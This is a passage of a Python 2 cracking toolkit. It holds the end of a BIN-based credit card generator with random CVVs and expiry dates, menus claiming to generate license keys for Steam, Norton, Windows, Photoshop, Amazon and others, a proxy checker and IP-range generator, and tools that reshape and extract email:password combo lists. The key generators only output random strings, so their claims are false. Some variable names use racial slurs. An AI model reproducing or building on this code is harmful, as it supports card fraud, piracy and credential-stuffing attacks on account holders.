        senpai= ''.join(choice(senpaion) for _ in range(sensei))
        yearbn1 = yearb
        mounthbn1 = mounthb
        cvvbn1 = cvvb
        if len(str(mounthb))==0:
          mounthbn = randrange(01,31,1)
          mounthbn1 = mounthbn
          if int(mounthbn1) <= 9:
            mounthbn1 = str('0'+str(mounthbn1))
        if len(str(yearb))==0:
          yearbn = randrange(2019,2025,1)
          yearbn1 = yearbn
        if len(str(cvvb))==0:
          cvvbn = ''.join(choice(string.digits) for _ in range(3))
          cvvbn1 = cvvbn
        sama = ("%s%s|%s|%s|%s"%(binner,senpai,yearbn1,mounthbn1,cvvbn1))
        print la7mar+sama
        with open('results/ccgen/ccgenerated.txt','a') as mark:
          mark.write(sama+'\n')
      print "%s+%s--------------------------%s+"%(lazra9,la7mar,lazra9)
      print "%s%s cc Saved In 'results/ccgen/ccgenerated.txt' ^_^"%(mouchi,la7mar)
      raw_input(fy+'Press Enter To Exit..'+fb);exit()
#ZeroEye Key Generat0r#
class zeroeye(object):
  def __init__ (self):
   if not os.path.isdir('results/keys'):
      os.mkdir('results/keys')
   self.zero()
   zack =raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   if zack in ['01','1']:
      self.steam()
   elif zack in ['02','2']:
      self.express()
   elif zack in ['03','3'] :
      self.hma()
   elif zack in ['04','4'] :
      self.karta()
   elif zack in ['05','5'] :
      self.g2a()
   elif zack in ['06','6'] :
      self.gplay()
   elif zack in ['07','7'] :
      self.avgantiv()
   elif zack in ['08','8']:
      self.esetss()
   elif zack in ['09','9']:
      self.Norton()
   elif zack =='10':
      self.photoshop()
   elif zack =='11':
      self.winkeyz()
   elif zack =='12':
      self.amazon()
   elif zack == '69' :
      mli7()
  def zero(self):
     print """
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y} [!] Sometimes U Need              {re}X
  X{y} To Use Vpn if U want to try a key {re}X
  X{y} (Ban Or CountryNotAvaible)        {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
    x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
    X {r}({b} 01 {r}){y} Steam                  {re}X
    X {r}({b} 02 {r}){y} Express                {re}X
    X {r}({b} 03 {r}){y} Hidemyass              {re}X
    X {r}({b} 04 {r}){y} Tn Mobile Sold         {re}X
    X {r}({b} 05 {r}){y} G2A                    {re}X
    X {r}({b} 06 {r}){y} Google Play            {re}X
    X {r}({b} 07 {r}){y} AVG Antivurus          {re}X
    X {r}({b} 08 {r}){y} Eset Smart Security    {re}X
    X {r}({b} 09 {r}){y} Norton Antivirus       {re}X
    X {r}({b} 10 {r}){y} PhotoShop Cs6          {re}X
    X {r}({b} 11 {r}){y} Win Keyz               {re}X
    X {r}({b} 12 {r}){y} Amaz0n                 {re}X
    X {r}({b} 69 {r}){y} Back                   {re}X
    x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x """.format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan,bl=blid)
  def steam(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}       Steam Generator      {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
     for az in range(int(zz)) :
      urname = string.ascii_letters + string.digits
      urname1 = ''.join(choice(urname) for _ in range(5))
      taki = string.ascii_letters + string.digits
      taki2 = ''.join(choice(taki) for _ in range(5))
      metsuha = string.ascii_letters + string.digits
      metsuha3 = ''.join(choice(metsuha) for _ in range(5))
      mark = urname1.upper() +('-')+ taki2.upper() +('-')+ metsuha3.upper()
      print movv,az+1,")",mark," by M4rk"
      save = open('results/keys/steam.txt','a')
      save.write(mark + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
      zeroeye()
     else:
      exit()
   except :
         pass
  def hma(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}        HMA Generator       {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
     for az in range(int(zz)) :
      urname = string.ascii_letters + string.digits
      urname1 = ''.join(choice(urname) for _ in range(6))
      taki = string.ascii_letters + string.digits
      taki2 = ''.join(choice(taki) for _ in range(6))
      metsuha = string.ascii_letters + string.digits
      metsuha3 = ''.join(choice(metsuha) for _ in range(6))
      mark = urname1.upper() +('-')+ taki2.upper() +('-')+ metsuha3.upper()
      print movv,az+1,")",mark," by M4rk"
      save = open("results/keys/hma.txt",'a')
      save.write(mark + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()
   except :
         pass
  def g2a(self) :
    print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}         G2A Generator       {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
    print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
    zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    try :
     for az in range(int(zz)) :
      urname = string.ascii_letters + string.digits
      urname1 = ''.join(choice(urname) for _ in range(4))
      taki = string.ascii_letters + string.digits
      taki2 = ''.join(choice(taki) for _ in range(4))
      metsuha = string.ascii_letters + string.digits
      metsuha3 = ''.join(choice(metsuha) for _ in range(4))
      mark = urname1.upper() +('-')+ taki2.upper() +('-')+ metsuha3.upper()
      print movv,az+1,")",mark," by M4rk"
      save = open("results/keys/g2a.txt", 'a')
      save.write(mark + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()
    except :
         pass

  def gplay(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}    GooGlePlay Generator    {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
     for az in range(int(zz)) :
      urname = string.ascii_letters + string.digits
      urname1 = ''.join(choice(urname) for _ in range(4))
      taki = string.ascii_letters + string.digits
      taki2 = ''.join(choice(taki) for _ in range(4))
      metsuha = string.ascii_letters + string.digits
      metsuha3 = ''.join(choice(metsuha) for _ in range(4))
      miki = string.ascii_letters + string.digits
      miki3 = ''.join(choice(miki) for _ in range(4))
      tsukaza = string.ascii_letters + string.digits
      tsukaza3 = ''.join(choice(tsukaza) for _ in range(4))
      mark = urname1.upper() +('-')+ taki2.upper() +('-')+ metsuha3.upper() +('-')+ miki3.upper() +('-')+ tsukaza3.upper()
      print movv,az+1,")",mark," by M4rk"
      save = open("results/keys/gplay.txt", 'a')
      save.write(mark + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()
   except :
         pass
  def express(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}    ExpressVpn Generator    {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
     for az in range(int(zz)) :
      urname = string.ascii_letters + string.digits
      urname1 = ''.join(choice(urname) for _ in range(22))
      print movv,az+1,")","E"+ urname1.upper()," by M4rk"
      save = open("results/keys/express.txt", 'a')
      save.write(urname1 + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()
   except :
         pass
  def karta(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}    TNrecharge Generator    {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
     for az in range(int(zz)) :
      gothar = string.digits
      gothar69 = ''.join(choice(gothar) for _ in range(14))
      print movv,az+1,")",gothar69," by M4rk"
      save = open("results/keys/karta.txt", 'a')
      save.write(gothar69 + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()
   except :
         pass
  def Norton(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}       Norton Generator     {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
     for az in range(int(zz)) :
      gothar = string.ascii_letters + string.digits
      gothar69 = ''.join(choice(gothar) for _ in range(23))
      print movv,az+1,")",'V'+gothar69.upper()," by M4rk"
      save = open("results/keys/norton.txt", 'a')
      save.write('V'+gothar69.upper() + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()

   except :
           pass
  def avgantiv(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}     AVG-AntiV Generator    {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
     for az in range(int(zz)) :
      meliodas = string.ascii_letters + string.digits
      meliodas1 = ''.join(choice(meliodas) for _ in range(4))
      ban = string.ascii_letters + string.digits
      ban1 = ''.join(choice(ban) for _ in range(5))
      king = string.ascii_letters + string.digits
      king1 = ''.join(choice(king) for _ in range(5))
      eskanor = string.ascii_letters + string.digits
      eskanor1 = ''.join(choice(eskanor) for _ in range(5))
      gothar = string.ascii_letters + string.digits
      gothar1 = ''.join(choice(gothar) for _ in range(2))
      nanatsu = '8MEH-R'+meliodas1.upper()+'-'+ban1.upper()+'-'+king1.upper()+'-'+eskanor1.upper()+'-'+gothar1.upper()+'MBR-ACED'
      print movv,az+1,")",nanatsu," by M4rk"
      save = open("results/keys/avgantiv.txt", 'a')
      save.write(nanatsu + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()
   except:
          pass
  def esetss(self) :
   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}  Eset SmartSec. Generato   {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
    {r}[{b}01{r}]{y} Keys
    {r}[{b}02{r}]{y} Accounts
    {r}[{b}69{r}]{y} Back
     """.format(r=la7mar,b=lazra9,y=lasfar,re=ramadi)
   psyco=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   if psyco in ['01','1']:
    print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
    zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    try :
     for az in range(int(zz)) :
      meliodas = string.ascii_letters + string.digits
      meliodas1 = ''.join(choice(meliodas) for _ in range(5))
      ban = string.ascii_letters + string.digits
      ban1 = ''.join(choice(ban) for _ in range(5))
      king = string.ascii_letters + string.digits
      king1 = ''.join(choice(king) for _ in range(5))
      eskanor = string.ascii_letters + string.digits
      eskanor1 = ''.join(choice(eskanor) for _ in range(5))
      gothar = string.ascii_letters + string.digits
      gothar1 = ''.join(choice(gothar) for _ in range(5))
      nanatsu = meliodas1.upper()+'-'+ban1.upper()+'-'+eskanor1.upper()+'-'+king1.upper()+'-'+gothar1.upper()
      print movv,az+1,")",nanatsu," by M4rk"
      save = open("results/keys/esetsskeys.txt", 'a')
      save.write(nanatsu + '\n')
     so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
     if so =='y' or so =='Y':
          zeroeye()
     else:
          exit()
    except :
          pass
   elif psyco in ['02','2']:
    print "%s[%s+%s] Enter Number Accounts  %s"%(la7mar,la5dhar,la7mar,lazra9)
    zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    try:
      for az in range(int(zz)) :
        nbadelelrapx99 = ''.join(choice(string.digits) for _ in range(10))
        mazelbekry = string.ascii_letters + string.digits
        mazelbekryx99 = ''.join(choice(string.digits) for _ in range(10))
        nhabettitle = 'UserNaMe : EVA-'+nbadelelrapx99+'\nPassword: '+mazelbekryx99.lower()+'\n-----------------------\nGenerated By M4rkWalker\n\n '
        print movv,az+1,")",nhabettitle
        save = open("results/keys/esetssup.txt", 'a')
        save.write(nhabettitle + '\n')
      so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
      if so =='y' or so =='Y':
          zeroeye()
      else:
          exit()
    except:
            pass
   else :
      zeroeye()
  def photoshop(self):
    print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}  PhotoShop CS6 Generator   {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
    print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
    zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    try:
      for az in range(int(zz)) :
          meliodas = string.digits
          meliodas1 = ''.join(choice(meliodas) for _ in range(5))
          ban = string.digits
          ban1 = ''.join(choice(ban) for _ in range(5))
          king = string.digits
          king1 = ''.join(choice(king) for _ in range(5))
          eskanor = string.ascii_letters + string.digits
          eskanor1 = ''.join(choice(eskanor) for _ in range(5))
          gothar = string.digits
          gothar1 = ''.join(choice(gothar) for _ in range(5))
          nanatsu= '1330'+'-'+meliodas1+'-'+ban1+'-'+king1+'-'+eskanor1+'-'+gothar1
          print movv,az+1,")",nanatsu,"\n------------By M4rkWalker---------------\n"
          save = open("results/keys/cs6.txt", 'a')
          save.write(nanatsu + '\n')
      so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
      if so =='y' or so =='Y':
          zeroeye()
      else:
          exit()
    except:
          pass
  def winkeyz(self):
    print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}      Windows Generator     {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
    print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
    zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    try:
      for az in range(int(zz)) :
          meliodas = string.ascii_letters + string.digits
          meliodas1 = ''.join(choice(meliodas) for _ in range(5))
          ban = string.ascii_letters + string.digits
          ban1 = ''.join(choice(ban) for _ in range(5))
          king = string.ascii_letters + string.digits
          king1 = ''.join(choice(king) for _ in range(5))
          eskanor = string.ascii_letters + string.digits
          eskanor1 = ''.join(choice(eskanor) for _ in range(5))
          gothar = string.ascii_letters + string.digits
          gothar1 = ''.join(choice(gothar) for _ in range(5))
          nanatsu= meliodas1.upper()+'-'+ban1.upper()+'-'+king1.upper()+'-'+eskanor1.upper()+'-'+gothar1.upper()
          print movv,az+1,")",nanatsu,"\n------------By M4rkWalker---------------\n"
          save = open("results/keys/win.txt", 'a')
          save.write(nanatsu + '\n')
      so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
      if so =='y' or so =='Y':
          zeroeye()
      else:
        exit()
    except:
          pass
  def amazon(self):

   print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}       Amazon Generator     {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
   print "%s[%s+%s] Enter Number Keys  %s"%(la7mar,la5dhar,la7mar,lazra9)
   zz=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   try :
    for az in range(int(zz)) :
      urname = string.ascii_letters + string.digits
      urname1 = ''.join(choice(urname) for _ in range(4))
      taki = string.ascii_letters + string.digits
      taki2 = ''.join(choice(taki) for _ in range(6))
      metsuha = string.ascii_letters + string.digits
      metsuha3 = ''.join(choice(metsuha) for _ in range(5))
      mark = urname1.upper() +('-')+ taki2.upper() +('-')+ metsuha3.upper()
      print movv,az+1,")",mark," by M4rk"
      save = open("results/keys/amazon.txt", 'a')
      save.write(mark + '\n')
    so=raw_input("%sContinue ? [%sY/N(yes/No)%s] >%s "%(la7mar,la5dhar,la7mar,lazra9))
    if so =='y' or so =='Y':
          zeroeye()
    else:
          exit()
   except :
          pass
class roxycheck(object):
    def __init__(self):
        if not os.path.isdir('results/iproxy'):
          os.mkdir('results/iproxy')
        IpList = raw_input("%s[%s+%s] Input IP List [ip:port]: %s"%(la7mar,la5dhar,la7mar,lazra9))
        with open(IpList, 'r') as reader:
            file = reader.read().splitlines()
        thread = []
        for x in file:
            t = threading.Thread(target=self.CheckIP, args=(x, ''))
            t.start()
            thread.append(t)
            time.sleep(0.05)
        for j in thread:
            j.join()
        Main()

    def CheckIP(self, Proxy, x):
        try:
            Got = requests.get('http://httpbin.org/html', proxies={'http': Proxy}, timeout=5)
            if 'Herman Melville - Moby-Dick' in Got.text:
                print(la5dhar+' Valid :'+str(Proxy))
                with open('results/iproxy/validips.txt', 'a') as xX:
                    xX.write(Proxy + '\n')
        except requests.Timeout:
            print('%s Timeout! : '%la7mar + str(Proxy))
        except requests.ConnectionError:
            print('%s Dead IP! : '%la7mar + str(Proxy))
##
class ghrab(object):
    def __init__(self):
        if not os.path.isdir('results/iproxy'):
          os.mkdir('results/iproxy')
        StartIP = raw_input('%s[%s+%s] Start IP: %s'%(la7mar,la5dhar,la7mar,lazra9))
        ENDIP = raw_input('%s[%s+%s] End IP: %s'%(la7mar,la5dhar,la7mar,lazra9))
        PRoxYPort = raw_input('%s[%s+%s] Enter Proxy port [8080,80]: %s'%(la7mar,la5dhar,la7mar,lazra9))
        ip_range = self.Generate_IP(StartIP, ENDIP)
        xXx=0
        for ip in ip_range:
            xXx=xXx+1
            with open('results/iproxy/Ipgenerated.txt', 'a') as xX:
                xX.write(str(ip) + ':' + str(PRoxYPort) + '\n')
        print "%s%s Ip Saved In 'results/iproxy/Ipgenerated.txt'"%(la5dhar,xXx)
        heroken()

    def Generate_IP(self, start_ip, end_ip):
        Start = list(map(int, start_ip.split(".")))
        end = list(map(int, end_ip.split(".")))
        rec = Start
        ip_range = []
        ip_range.append(start_ip)
        while rec != end:
            Start[3] += 1
            for i in (3, 2, 1):
                if rec[i] == 256:
                    rec[i] = 0
                    rec[i - 1] += 1
            ip_range.append(".".join(map(str, rec)))
        return ip_range
##
class transformator(object):
  def __init__(self):
    if not os.path.isdir('results/combos'):
      os.mkdir('results/combos')
    self.logo()
    if reponse in ['01','1']:
      self.kamel()
    elif reponse in ['02','2']:
       self.abda()
    elif reponse=='69':
      heroken()
  def logo(self):
      global reponse
      print"""
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}       ~Transformator~      {re}X
  X{y}    User     <=>     Email  {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
    x{r}XXXXXXXXXXXXXXXXXXXXXXXX{re}x
    X{r} ({b} 01 {r}){y} Email > User    {re}X
    X{r} ({b} 02 {r}){y} User > Email    {re}X
    X{r} ({b} 69 {r}){y} Back            {re}X
    x{r}XXXXXXXXXXXXXXXXXXXXXXXX{re}x
  """.format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi)
      reponse=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
  def kamel(self):
    linklistmail=[]
    print """

  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}        Email > User        {re}X
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
     """.format(r=la7mar,y=lasfar,re=ramadi)
    linklistmail=raw_input("%s[%s+%s] Enter List : %s"%(la7mar,la5dhar,la7mar,lazra9))
    yoo=[]
    nb=0
    with open (linklistmail,'r') as yoo:
        yoo=yoo.read().splitlines()
    for y2o in yoo:
      if '@' not in str(y2o):
        pass
      else:
        en = y2o.index(str('@'))
        en = y2o[0:en]
        fr = y2o.index(str(':'))
        ded = y2o[fr:]
        mod=en+ded
        nb=nb+1
        with open('results/combos/Mod2_%s'%(linklistmail),'a') as modlis:
          modlis.write(mod.strip() + '\n')
    print "%s Username%s Saved In 'results/combos/Mod2_%s' \033[00m"%(la5dhar,nb,linklistmail)
    raw_input(fy+'Press Enter To Exit..'+fb);exit()
  def abda(self):
    print """
  {re}
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}        User > Email        {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x

    {r}[{b}1{r}]{y} Add Random E-mails
    {r}[{b}2{r}]{y} Single Domain E-mail """.format(r=la7mar,b=lazra9,y=lasfar,re=ramadi)
    maill=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    linklistmail=raw_input("%s[%s+%s] Enter List : %s"%(la7mar,la5dhar,la7mar,lazra9))
    if maill=='1':
      yoo=[]
      nb=0
      with open (linklistmail,'r') as yoo:
        yoo=yoo.read().splitlines()
      for y2o in yoo:
        if '@' in str(y2o):
          pass
        elif ':' in str(y2o):
         fr = y2o.index(str(':'))
         ar = y2o[0:fr]
         ded = y2o[fr:]
         mod=str(ar)+choice(listmail)
         mod=mod+ded
         with open('results/combos/Mod_%s'%(linklistmail),'a') as modlis:
          modlis.write(mod.strip() + '\n')
        else:
         mod=str(ar)+str(y2o)
         mod=mod+ded
         with open('results/combos/Mod_%s'%(linklistmail),'a') as modlis:
          modlis.write(mod.strip() + '\n')
      raw_input(fy+'Press Enter To Exit..'+fb);exit()
    elif maill=='2':
      soo=raw_input("%s[%s+%s] Enter Email [Like > @gmail.com] : %s"%(la7mar,la5dhar,la7mar,lazra9))
      yoo=[]
      try: 
        with open (linklistmail,'r') as yoo:
          yoo=yoo.read().splitlines()
      except:
        print "{!} Error File";exit()
      for y2o in yoo:
        if '@' in str(y2o):
          pass
        elif ':' in str(y2o):
         fr = y2o.index(str(':'))
         ar = y2o[0:fr]
         ded = y2o[fr:]
         mod=str(ar)+str(soo)
         mod=mod+ded
         nb=nb+1
         with open('results/combos/Mod_%s'%(linklistmail),'a') as modlis:
          modlis.write(mod.strip() + '\n')
        else:
         mod=str(ar)+str(y2o)
         mod=mod+ded
         nb=nb+1
         with open('results/combos/Mod_%s'%(linklistmail),'a') as modlis:
          modlis.write(mod.strip() + '\n')
      print "%s Email%s Saved In 'results/combos/Mod2_%s' \033[00m"%(la5dhar,nb,linklistmail);raw_input(fy+'Press Enter To Exit..'+fb);exit()
##
class EscanorSamata(object):
  def __init__(self):
    if not os.path.isdir('results/combos'):
      os.mkdir('results/combos')
    self.yo()
    marlin=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
    if marlin in ['01','1']:
      self.combo()
    elif marlin in ['02','2']:
      self.proxy()
    elif marlin in ['03','3']:
      self.zouj()
    elif marlin in ['04','4']:
      self.email()
    elif marlin =='69':
      heroken()

  def yo(self):
   print """{re}
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}        Multi Extractor         {re}X
  X{y}       Extact From Files :      {re}X
  X{y}    Should be .txt Or .html..   {re}X
  X{y}    Loading ... M4rk Leecher    {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  {r}({b}01{r}){y} Combo
  {r}({b}02{r}){y} Proxy
  {r}({b}03{r}){y} Proxy&Combo
  {r}({b}04{r}){y} Emails
  {r}({b}69{r}){y} Back
 """.format(r=la7mar,b=lazra9,y=lasfar,re=ramadi)
  def combo(self):
    nb=0
    li=raw_input("%s[%s+%s] Enter File : %s"%(la7mar,la5dhar,la7mar,lazra9))
    with open(li,'r') as lines:
     lines=lines.read().splitlines()
     fun=open('results/combos/Combo_(%s).txt'%li,'a')
     for line in lines:
      bomb = line.split(' ')
      for i in bomb:
        if ':80' in i or ':8080' in i:
          pass
        if ':' in i:
         i=i.replace('\n','')
         fun.write(str(i)+'\n')
         nb=nb+1
    print "%s Combo %s Saved In 'results/combos/Combo_(%s).txt' \033[00m"%(la5dhar,nb,li)
    raw_input(fy+'Press Enter To Exit..'+fb);exit()
  def proxy(self):
    nb=0
    li=raw_input("%s[%s+%s] Enter File : %s"%(la7mar,la5dhar,la7mar,lazra9))
    suck=[];nigga=[];sock=0;http=0
    with open(li,'r') as lines:
     lines=lines.read().splitlines()
     fun=open('results/combos/HTTP_(%s).txt'%li,'a')
     fun2=open('results/combos/SOCK4-5_(%s).txt'%li,'a')
     for line in lines:
      bomb = line.split(' ')
      for i in bomb:
        if ':' in i:
         fr = i.index(str(':'))
         ar = i[0:fr]
         ded = i[fr:][1:]
         if '80' in str(ded) or '8080' in str(ded):
          s7i7=0
          nigga = ar.split('.')
          for suck in nigga:
           if not suck.isdigit():
            pass
           else:
            s7i7=s7i7+1
          if s7i7==4:
            i=i.replace('\n','')
            fun.write(str(i)+'\n')
            http=http+1
         elif len(str(ded))==5 and (ded.isdigit()) :
          s7i7=0
          nigga = ar.split('.')
          for suck in nigga:
           if not suck.isdigit():
            pass
           else:
            s7i7=s7i7+1
          if s7i7==4:
            i=i.replace('\n','')
            fun2.write(str(i)+'\n')
            sock=sock+1
    print "  %s[%s!%s]%s %s Proxy "%(la7mar,la5dhar,la7mar,la5dhar,(sock+http))
    print "   %s[%s+%s]%s %s HTTP "%(la7mar,lazra9,la7mar,la5dhar,http)
    print "   %s[%s+%s]%s %s SOCK4/5 "%(la7mar,lazra9,la7mar,la5dhar,sock)
    print "%s~~> Saved In 'results/combos/' \033[00m"%(la5dhar,li)
    raw_input(fy+'Press Enter To Exit..'+fb);exit()
  def zouj(self):
    li=raw_input("%s[%s+%s] Enter File : %s"%(la7mar,la5dhar,la7mar,lazra9))
    nb=0
    suck=[];nigga=[];sock=0;http=0
    with open(li,'r') as lines:
     lines=lines.read().splitlines()
     fun=open('results/combos/HTTP_(%s).txt'%li,'a')
     fun2=open('results/combos/SOCK4-5_(%s).txt'%li,'a')
     fun3=open('results/combos/Combo_(%s).txt'%li,'a')
     for line in lines:
      bomb = line.split(' ')
      for i in bomb:
        if ':' in i:
         fr = i.index(str(':'))
         ar = i[0:fr]
         ded = i[fr:][1:]
         if '80' in str(ded) or '8080' in str(ded):
          s7i7=0
          nigga = ar.split('.')
          for suck in nigga:
           if not suck.isdigit():
            pass
           else:
            s7i7=s7i7+1
          if s7i7==4:
            i=i.replace('\n','')
            fun.write(str(i)+'\n')
            http=http+1
         elif len(str(ded))==5 and (ded.isdigit()) :
          s7i7=0
          nigga = ar.split('.')
          for suck in nigga:
